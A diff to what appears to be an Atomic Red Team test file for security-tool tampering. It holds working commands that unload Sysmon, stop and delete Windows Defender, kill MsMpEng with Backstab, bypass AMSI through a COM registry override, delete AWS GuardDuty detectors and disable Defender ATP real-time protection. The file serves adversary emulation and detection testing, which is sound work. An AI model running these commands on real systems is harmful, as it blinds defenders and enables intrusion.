@@ -201,33 +201,38 @@ atomic_tests:
   - description: |
       Sysmon must be downloaded
     prereq_command: |
-      if ((cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") -or (Test-Path $env:Temp\Sysmon\Sysmon.exe)) { exit 0 } else { exit 1 }
+      if (-not (cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") -or (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe")) { exit 0 } else { exit 1 }
     get_prereq_command: |
-      Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"
-      Expand-Archive $env:TEMP\Sysmon.zip $env:TEMP\Sysmon -Force
-      Remove-Item $env:TEMP\Sysmon.zip -Force
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip"
+      Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip" "PathToAtomicsFolder\..\ExternalPayloads\Sysmon" -Force
   - description: |
       sysmon must be Installed
     prereq_command: |
       if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }
     get_prereq_command: |
       if(cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") { C:\Windows\Sysmon.exe -accepteula -i } else
-      { Set-Location $env:TEMP\Sysmon\; .\Sysmon.exe -accepteula -i}
+      { & "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -accepteula -i}
   - description: |
       sysmon filter must be loaded
     prereq_command: |
       if(fltmc.exe filters | findstr #{sysmon_driver}) { exit 0 } else { exit 1 }
     get_prereq_command: |
-      sysmon -u
-      sysmon -accepteula -i
+      if(Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"){
+        & "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -u
+        & "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -accepteula -i
+      }else{
+        sysmon -u
+        sysmon -accepteula -i
+      }
   executor:
     command: |
       fltmc.exe unload #{sysmon_driver}
     cleanup_command: |
       sysmon -u -i > nul 2>&1
       sysmon -i -accepteula -i > nul 2>&1
-      %temp%\Sysmon\sysmon.exe -u > nul 2>&1
-      %temp%\Sysmon\sysmon.exe -accepteula -i > nul 2>&1
+      "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -u > nul 2>&1
+      "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -accepteula -i > nul 2>&1
     name: command_prompt
     elevation_required: true
 - name: Uninstall Sysmon
@@ -565,37 +570,7 @@ atomic_tests:
       Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
     name: command_prompt
     elevation_required: true
-- name: Disable Defender with Defender Control
-  auto_generated_guid: 178136d8-2778-4d7a-81f3-d517053a4fd6
-  description: |
-    Attempting to use Defender Control software to disable Windows Defender. Upon successful execution, Windows Defender will be turned off. 
-  supported_platforms:
-  - windows
-  input_arguments:
-    DefenderID:
-      description: Defender ID that is used as a sort of passcode to disable it within Defender Control from the command line. The machine-specific Defender ID can be obtained within Defender Control by going to menu, command line info, and then retrieving the 4 character passcode to continue (listed after defendercontrol /d /id in the command line info window).
-      type: string
-      default: FFFF
-    DefenderControlExe:
-      description: Path to Defender Control software version 1.6.
-      type: string
-      default: $env:temp\DefenderControl\DefenderControl\DefenderControl.exe
-  dependency_executor_name: powershell
-  dependencies:
-  - description: |
-      Defender Control must be installed on the machine. 
-    prereq_command: |
-      if (Test-Path #{DefenderControlExe}) {exit 0} else {exit 1}
-    get_prereq_command: |
-      Start-BitsTransfer -Source "https://web.archive.org/web/20201210152711/https://www.sordum.org/files/download/defender-control/DefenderControl.zip" -Destination "$env:temp\defendercontrol.zip" -dynamic
-      expand-archive -LiteralPath "$env:temp\defendercontrol.zip" -DestinationPath "$env:temp\DefenderControl"
-  executor:
-    command: |
-      cmd /c #{DefenderControlExe} /D #{DefenderID} | Out-Null
-    cleanup_command: |
-      cmd /c #{DefenderControlExe} /E | Out-Null
-    name: powershell
-    elevation_required: true
+
 - name: Disable Defender Using NirSoft AdvancedRun
   auto_generated_guid: 81ce22fd-9612-4154-918e-8a1f285d214d
   description: |
@@ -609,7 +584,7 @@ atomic_tests:
     AdvancedRun_Location:
       description: Path of Advanced Run executable
       type: path
-      default: '$env:temp\AdvancedRun.exe'
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe'
     delete_defender_folder:
       description: Set to 1 to also delete the Windows Defender folder
       type: integer
@@ -619,19 +594,20 @@ atomic_tests:
   - description: |
       Advancedrun.exe must exist at #{AdvancedRun_Location}
     prereq_command: |
-      if(Test-Path -Path #{AdvancedRun_Location}) {exit 0} else {exit 1}
+      if(Test-Path -Path "#{AdvancedRun_Location}") {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest "http://www.nirsoft.net/utils/advancedrun.zip" -OutFile "$env:temp\advancedrun.zip"
-      Expand-Archive -path "$env:temp\advancedrun.zip" -destinationpath "$env:temp\" -Force
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "http://www.nirsoft.net/utils/advancedrun.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip"
+      Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -Force
   executor:
     command: |
-      Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
+      Try {cmd /c "#{AdvancedRun_Location}" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
       if(#{delete_defender_folder}){
         $CommandToRun = rmdir "$env:programdata\Microsoft\Windows Defender" -Recurse
-        Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{}
+        Try {cmd /c "#{AdvancedRun_Location}" /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{}
       }
     cleanup_command: |
-      Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "start WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
+      Try {cmd /c "#{AdvancedRun_Location}" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "start WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
     name: powershell
     elevation_required: true
 - name: Kill antimalware protected processes using Backstab
@@ -648,11 +624,14 @@ atomic_tests:
       default: MsMpEng.exe
   dependency_executor_name: powershell
   dependencies:
-  - description: Backstab64.exe should exist in %temp%
-    prereq_command: if (Test-Path $env:temp\Backstab64.exe) {exit 0} else {exit 1}
-    get_prereq_command: Start-BitsTransfer -Source "https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe" -Destination "$env:temp\Backstab64.exe" -dynamic
+  - description: Backstab64.exe should exist in ExtrnalPayloads Directory
+    prereq_command: if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe"
   executor:
-    command: '& $env:temp\Backstab64.exe -k -n #{process_name}'
+    command: |
+      & "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe" -k -n #{process_name}
     name: powershell
     elevation_required: true
 - name: WinPwn - Kill the event log services for stealth
@@ -917,3 +896,63 @@ atomic_tests:
       reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "Locked" /f
     name: powershell
     elevation_required: true
+- name: AMSI Bypass - Override AMSI via COM
+  auto_generated_guid: 17538258-5699-4ff1-92d1-5ac9b0dc21f5
+  description: |
+    With administrative rights, an adversary can disable AMSI via registry value in HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec} by overriding the Microsoft Defender COM object for AMSI and points it to a DLL that does not exist.
+    This is currently being used by AsyncRAT and others. 
+    https://strontic.github.io/xcyclopedia/library/clsid_fdb00e52-a214-4aa1-8fba-4357bb0072ec.html
+    https://securitynews.sonicwall.com/xmlpost/asyncrat-variant-includes-cryptostealer-capabilites/
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
+    cleanup_command: |
+      REG DELETE HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /f
+    name: command_prompt
+    elevation_required: true
+- name: AWS - GuardDuty Suspension or Deletion
+  auto_generated_guid: 11e65d8d-e7e4-470e-a3ff-82bc56ad938e
+  description: |
+    Enables GuardDuty in AWS, upon successful creation this test will suspend and then delete the GuardDuty configuration.
+  supported_platforms:
+  - iaas:aws
+  input_arguments:
+    region:
+      description: Name of the specified region
+      type: string
+      default: us-east-1
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      Check if ~/.aws/credentials file has a default stanza is configured
+    prereq_command: |
+      cat ~/.aws/credentials | grep "default"
+    get_prereq_command: |
+      echo "Please install the aws-cli and configure your AWS default profile using: aws configure"
+  executor:
+    command: |
+      detectorId=$(aws guardduty create-detector --enable --region "#{region}" | grep -oP '(?<="DetectorId": ")[^"]*')
+      aws guardduty update-detector --no-enable --detector-id $detectorId
+      aws guardduty delete-detector --detector-id $detectorId
+    cleanup_command: |
+      echo "If test successfully ran, no cleanup required."
+    name: bash
+    elevation_required: false
+- name: Tamper with Defender ATP on Linux/MacOS
+  auto_generated_guid: 40074085-dbc8-492b-90a3-11bcfc52fda8
+  description: |
+    With root privileges, an adversary can disable real time protection. Note, this test assumes Defender is not in passive mode and real-time protection is enabled. The use of a managed.json on Linux or Defender .plist on MacOS will prevent these changes. Tamper protection will also prevent this (available on MacOS, but not Linux at the time of writing). Installation of MDATP is a prerequisite. Installation steps vary across MacOS and Linux distros. See Microsoft public documentation for instructions: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/mac-install-manually?view=o365-worldwide https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-install-manually?view=o365-worldwide
+  supported_platforms:
+  - linux
+  - macos
+  executor:
+    command: |
+      sudo mdatp config real-time-protection --value disabled
+    cleanup_command: |
+      sudo mdatp config real-time-protection --value enabled
+    name: sh
+    elevation_required: true
+  
+  
